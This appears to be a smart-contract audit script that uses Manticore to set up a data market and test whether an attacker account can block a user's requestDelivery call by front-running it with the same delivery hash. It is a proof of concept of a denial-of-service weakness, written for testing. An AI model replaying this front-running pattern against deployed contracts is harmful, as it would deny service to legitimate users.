from manticore.ethereum import ManticoreEVM
from manticore.utils import config
#from manticore.core.smtlib.expression import BoolAnd, BoolNot
from manticore.ethereum.abi import ABI

from initialize_market import initialize, DEFAULT_PARAMETERS
from constants import ONE_ETH, ONE_GWEI
from utils import increase_timestamp

consts = config.get_group("evm")
consts.oog = "ignore"

################ Script #######################

m = ManticoreEVM()

market_parameters = DEFAULT_PARAMETERS


market_parameters['vote_by_d'] = 1
market_parameters['pl'] = 1
market_parameters['stk'] = 1

market = initialize(m, parameters=market_parameters, user_initial_eth_balance=100*ONE_ETH )

# user (market.ether_token_owner)
print("[+] Setting up a user account")

market.ether_token_contract.approve(market.reserve_contract, 100*ONE_ETH, caller=market.ether_token_owner) 
market.market_token_contract.approve(market.voting_contract, 100*ONE_ETH, caller=market.ether_token_owner) 
market.ether_token_contract.approve(market.datatrust_contract, 100*ONE_ETH, caller=market.ether_token_owner) 

market.reserve_contract.support(ONE_ETH, caller=market.ether_token_owner)

attacker_balance = 100 * ONE_ETH
attacker_account = m.create_account(balance=attacker_balance)
print("[+] Creating a attacker account", hex(attacker_account.address))

user_delivery_hash = "my_delivery_hash"

market.datatrust_contract.requestDelivery(user_delivery_hash, 0, caller=attacker_account)
market.datatrust_contract.requestDelivery(user_delivery_hash, 1, caller=market.ether_token_owner)

if (list(m.ready_states) == []):
  print("requestDelivery was blocked by an attacker")

m.finalize()
print(f"[+] Look for results in {m.workspace}")
